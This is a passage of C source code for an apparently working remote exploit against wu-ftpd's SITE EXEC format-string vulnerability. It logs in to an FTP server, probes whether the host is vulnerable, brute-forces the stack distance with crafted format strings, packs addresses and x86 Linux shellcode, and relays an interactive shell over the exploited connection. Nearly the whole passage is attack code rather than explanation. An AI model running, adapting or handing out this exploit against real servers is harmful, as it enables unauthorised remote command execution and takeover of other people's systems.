			printf ("hit at 0x%08lx: %s\n", addr - (blipcount - n), figure - n);
			if (verbose > 1)
				printf ("%s\n", rbuf);
		}

		xp_bufaddr = addr + n - tend + 1;
		if (verbose)
			printf ("buffer is located at: 0x%08lx\n", xp_bufaddr);

		return (xp_bufaddr);
	}

	return (0);
}


void
xpad_cat (unsigned char *fabuf, unsigned long int addr)
{
	int		i;
	unsigned char	c;


	for (i = 0 ; i <= 3 ; ++i) {
		switch (i) {
		case (0):
			c = (unsigned char) ((addr & 0x000000ff)      );
			break;
		case (1):
			c = (unsigned char) ((addr & 0x0000ff00) >>  8);
			break;
		case (2):
			c = (unsigned char) ((addr & 0x00ff0000) >> 16);
			break;
		case (3):
			c = (unsigned char) ((addr & 0xff000000) >> 24);
			break;
		}
		if (c == 0xff)
			sprintf (fabuf + strlen (fabuf), "%c", c);

		sprintf (fabuf + strlen (fabuf), "%c", c);
	}

	return;
}


unsigned long int
ftp_finddist (void)
{
	int			i,
				rdist;		/* relative distance */

	char *			s;
	char			sbuf[1024],
				rbuf[1024];

	unsigned long int	e1,
				e2;


	xp_bufdist = 0x0;
	memset (sbuf, '\x00', sizeof (sbuf));

	/* brute routine taken from bobek.py
	 */
	for (rdist = 0 ; rdist < (tg->bufdist_max - tg->bufdist_min);
		rdist += 8)
	{
		sprintf (sbuf, "SITE EXEC 7 mmmmnnnn");

		for (i = 0 ; i < (tg->bufdist_min / 8) ; ++i)
			strcat (sbuf, "%.f");

		for (i = 0 ; i < (rdist / 8) ; ++i)
			strcat (sbuf, "%.f");
		for (i = 0 ; i < ((rdist % 8) / 4) ; ++i)
			strcat (sbuf, "%d");

		strcat (sbuf, "|%08x|%08x|");
		if (verbose > 1)
			printf ("%s\n", sbuf);
		net_write (ftpsock, "%s\n", sbuf);

		memset (rbuf, '\x00', sizeof (rbuf));
		if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20) <= 0)
			return (0);

		printf ("#");
		fflush (stdout);

		if (verbose > 1)
			printf ("%s", rbuf);

		s = strchr (rbuf, '|');
		if (s == NULL)
			return (0);
		s++;
		if (sscanf (s, "%08lx|%08lx", &e1, &e2) != 2)
			return (0);

		if (e1 == 0x6d6d6d6d) {
			xp_bufdist = tg->bufdist_min + rdist;
		} else if (e1 == 0x6e6d6d6d) {
			xp_bufdist = tg->bufdist_min + rdist - 1;
		} else if (e1 == 0x6e6e6d6d) {
			xp_bufdist = tg->bufdist_min + rdist - 2;
		} else if (e1 == 0x6e6e6e6d) {
			xp_bufdist = tg->bufdist_min + rdist - 3;
		} else if (e1 == 0x6e6e6e6e) {
			xp_bufdist = tg->bufdist_min + rdist - 4;
		} else if (e2 == 0x6e6e6e6d) {
			xp_bufdist = tg->bufdist_min + rdist + 1;
		} else if (e2 == 0x6e6e6d6d) {
			xp_bufdist = tg->bufdist_min + rdist + 2;
		} else if (e2 == 0x6e6d6d6d) {
			xp_bufdist = tg->bufdist_min + rdist + 3;
		} else if (e2 == 0x6d6d6d6d) {
			xp_bufdist = tg->bufdist_min + rdist + 4;
		}

		ftp_recv_until (ftpsock, NULL, 0, "200 ");

		if (xp_bufdist != 0)
			return (xp_bufdist);

	}

	return (0);
}


int
ftp_vuln (void)
{
	int	vuln = 0;
	char	resp[512];


	net_write (ftpsock, "SITE EXEC %s\n", "%020d|%.f%.f|");
	memset (resp, '\x00', sizeof (resp));
	if (net_rlinet (ftpsock, resp, sizeof (resp) - 1, 20) <= 0)
		goto fverr;

	if (memcmp (resp, "200-0000000", 11) == 0)
		vuln = 1;


	if (strstr (resp, "|??????????????|") != NULL) {
		printf ("\n  failed. this host is using the vsnprintf routine supplied\n"
			"  with wuftpd, because it lacks a vsnprintf routine itself.\n"
			"  however the wuftpd routine is not exploitable, even with the\n"
			"  ability to supply the format string, sorry.\n\n");

		exit (EXIT_FAILURE);
	}

	if (memcmp (resp, "500", 3) == 0)
		return (0);

	if (memcpy (resp, "200 ", 4) == 0)
		return (vuln);
	else
		ftp_recv_until (ftpsock, resp, sizeof (resp), "200 ");

	return (vuln);

fverr:
	if (ftpsock > 0)
		close (ftpsock);

	return (0);
}


void
ftp_recv_until (int sock, char *buff, int len, char *begin)
{
	char	dbuff[2048];


	if (buff == NULL) {
		buff = dbuff;
		len = sizeof (dbuff);
	}

	do {
		memset (buff, '\x00', len);
		if (net_rlinet (sock, buff, len - 1, 20) <= 0)
			return;
	} while (memcmp (buff, begin, strlen (begin)) != 0);

	return;
}


int
ftp_login (void)
{
	char 	resp[512];


	ftpsock = net_connect (NULL, hostname, 21, NULL, 0, 30);
	if (ftpsock <= 0)
		return (0);

	memset (resp, '\x00', sizeof (resp));
	if (net_rlinet (ftpsock, resp, sizeof (resp) - 1, 20) <= 0)
		goto flerr;

	if (memcmp (resp, "220 ", 4) != 0) {
		if (verbose)
			printf ("\n%s\n", resp);
		goto flerr;
	}

	net_write (ftpsock, "USER %s\n", username);
	memset (resp, '\x00', sizeof (resp));
	if (net_rlinet (ftpsock, resp, sizeof (resp) - 1, 20) <= 0)
		goto flerr;

	if (memcmp (resp, "331 ", 4) != 0) {
		if (verbose)
			printf ("\n%s\n", resp);
		goto flerr;
	}

	net_write (ftpsock, "PASS %s\n", password);
	memset (resp, '\x00', sizeof (resp));
	if (net_rlinet (ftpsock, resp, sizeof (resp) - 1, 20) <= 0)
		goto flerr;


	/* handle multiline responses from ftp servers
	 */
	if (memcmp (resp, "230-", 4) == 0)
		ftp_recv_until (ftpsock, resp, sizeof (resp), "230 ");

	if (memcmp (resp, "230 ", 4) != 0) {
		if (verbose)
			printf ("\n%s\n", resp);
		goto flerr;
	}

	return (ftpsock);

flerr:
	if (ftpsock > 0)
		close (ftpsock);

	return (0);
}


void
shell (int sock)
{
	int	l;
	char	buf[512];
	fd_set	rfds;


	while (1) {
		FD_SET (0, &rfds);
		FD_SET (sock, &rfds);

		select (sock + 1, &rfds, NULL, NULL, NULL);
		if (FD_ISSET (0, &rfds)) {
			l = read (0, buf, sizeof (buf));
			if (l <= 0) {
				perror ("read user");
				exit (EXIT_FAILURE);
			}
			write (sock, buf, l);
		}

		if (FD_ISSET (sock, &rfds)) {
			l = read (sock, buf, sizeof (buf));
			if (l <= 0) {
				perror ("read remote");
				exit (EXIT_FAILURE);
			}
			write (1, buf, l);
		}
	}
}


void
hexdump (unsigned char *cbegin, unsigned int length)
{
	int		i;
	unsigned char *	cend = cbegin + length;
	unsigned char *	buf = cbegin;

	printf ("/* %d byte shellcode */\n", cend - cbegin);
	printf ("\"");
	for (i = 0 ; buf < (unsigned char *) cend; ++buf) {

		printf ("\\x%02x", *buf & 0xff);

		if (++i >= 12) {
			i = 0;
			printf ("\"\n\"");
		}
	}
	printf ("\";\n");

	printf("\n");

	return;
}


static int
sc_build_x86_lnx (unsigned char *target, size_t target_len, unsigned char *shellcode,
	char **argv)
{
	int	i;
	size_t	tl_orig = target_len;


	if (strlen (shellcode) >= (target_len - 1))
		return (-1);

	memcpy (target, shellcode, strlen (shellcode));
	target += strlen (shellcode);
	target_len -= strlen (shellcode);

	for (i = 0 ; argv[i] != NULL ; ++i)
		;

	/* set argument count
	 */
	target[0] = (unsigned char) i;
	target++;
	target_len--;

	for ( ; i > 0 ; ) {
		i -= 1;

		if (strlen (argv[i]) >= target_len)
			return (-1);

		printf ("[%3d/%3d] adding (%2d): %s\n",
			(tl_orig - target_len), tl_orig,
			strlen (argv[i]), argv[i]);

		memcpy (target, argv[i], strlen (argv[i]));
		target += strlen (argv[i]);
		target_len -= strlen (argv[i]);

		target[0] = (unsigned char) (i + 1);
		target++;
		target_len -= 1;
	}

	return (tl_orig - target_len);
}

